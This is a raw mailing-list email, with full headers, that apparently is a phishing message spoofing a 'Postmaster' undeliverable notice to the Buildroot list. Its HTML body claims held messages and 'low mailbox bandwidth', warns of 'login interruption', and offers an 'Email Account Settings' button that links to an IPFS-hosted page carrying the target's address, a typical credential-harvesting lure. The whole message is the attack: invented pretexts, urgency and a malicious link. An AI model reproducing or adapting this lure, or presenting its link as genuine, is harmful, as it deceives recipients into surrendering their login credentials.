Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 96E6DD13588
	for <buildroot@archiver.kernel.org>; Mon, 28 Oct 2024 08:54:27 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp4.osuosl.org (Postfix) with ESMTP id 48354404C0;
	Mon, 28 Oct 2024 08:54:27 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp4.osuosl.org ([127.0.0.1])
 by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 3FuEnC4TP9-Q; Mon, 28 Oct 2024 08:54:26 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 0C5A54049F
Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
	by smtp4.osuosl.org (Postfix) with ESMTP id 0C5A54049F;
	Mon, 28 Oct 2024 08:54:26 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by lists1.osuosl.org (Postfix) with ESMTP id 12DFCAEE
 for <buildroot@buildroot.org>; Mon, 28 Oct 2024 08:54:24 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id E89CC81137
 for <buildroot@buildroot.org>; Mon, 28 Oct 2024 08:54:23 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id nhUoYZkWPeFy for <buildroot@buildroot.org>;
 Mon, 28 Oct 2024 08:54:23 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=104.168.34.171;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org EACE680DA9
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org EACE680DA9
Received: from busybox.net (unknown [104.168.34.171])
 by smtp1.osuosl.org (Postfix) with ESMTP id EACE680DA9
 for <buildroot@busybox.net>; Mon, 28 Oct 2024 08:54:22 +0000 (UTC)
From: Postmaster <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 28 Oct 2024 09:54:22 +0100
Message-ID: <20241028095422.89F9C455B6235C90@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Undeliverable: Incoming messages failure
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.30
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============9025926934263389913=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============9025926934263389913==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<table width=3D"100%" bgcolor=3D"#ffffff" border=3D"0" cellspacing=3D"0" ce=
llpadding=3D"0">
<tbody>
<tr>
<td height=3D"1" style=3D"margin: 0px;" bgcolor=3D"#dae1e9"><font size=3D"1=
"></font></td></tr>
<tr>
<td height=3D"24" style=3D"margin: 0px;"><font size=3D"1">&nbsp;</font></td=
></tr>
<tr>
<td align=3D"center" style=3D"margin: 0px;">
<p><font size=3D"4">Dear&nbsp;</font><a style=3D"color: rgb(34, 34, 34);"><=
font size=3D"4">buildroot@busybox.net</font></a><font size=3D"4">,</font></=
p><span style=3D"color: rgb(72, 84, 93); line-height: 24px; font-size: 14px=
;"><font size=3D"4">Your incoming messages has been placed on hold due to l=
ow mailbox bandwidth.<br>Go to Email account settings below to review held =
messages and fix bugs.</font></span></td></tr>
<tr>
<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4">&nbsp;</font></td=
></tr>
<tr>
<td width=3D"48%" align=3D"center" valign=3D"top" style=3D"margin: 0px;"><s=
pan><a style=3D"padding: 15px 25px; color: rgb(255, 255, 255); text-decorat=
ion: none; display: block; background-color: rgb(0, 135, 209);" href=3D"htt=
ps://ipfs.io/ipfs/bafkreibetdhzvluuwiy2nbxc5xuhhzq3ixgffs6t4u4hnbhzqwsvinrk=
bi?filename=3Dnew.index.html#buildroot@busybox.net" rel=3D"noopener norefer=
rer"><font size=3D"4">Email Account Settings</font></a></span></td></tr>
<tr>
<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4"></font></td></tr>=

<tr>
<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4"></font></td></tr>=

<tr>
<td align=3D"center" style=3D"margin: 0px;">
<p style=3D"color: rgb(162, 162, 162); line-height: 17px; font-size: 12px; =
font-style: italic;"><font size=3D"3">Failure to review your account may ca=
use login interruption.<br>&copy; 2023 busybox.net. All Rights Reserved.</f=
ont></p></td></tr></tbody></table></body></html>

--===============9025926934263389913==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============9025926934263389913==--
